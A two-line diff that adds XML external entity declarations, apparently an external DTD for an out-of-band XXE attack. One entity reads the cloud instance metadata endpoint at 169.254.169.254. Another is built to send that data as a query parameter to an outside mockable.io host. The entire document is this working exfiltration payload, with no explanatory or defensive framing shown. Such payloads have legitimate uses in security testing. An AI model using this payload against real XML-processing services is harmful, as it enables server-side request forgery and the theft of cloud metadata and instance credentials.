@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "http://169.254.169.254/latest/meta-data">
+<!ENTITY % two "<!ENTITY four SYSTEM 'http://demo6986808.mockable.io/?test=%three;'>">
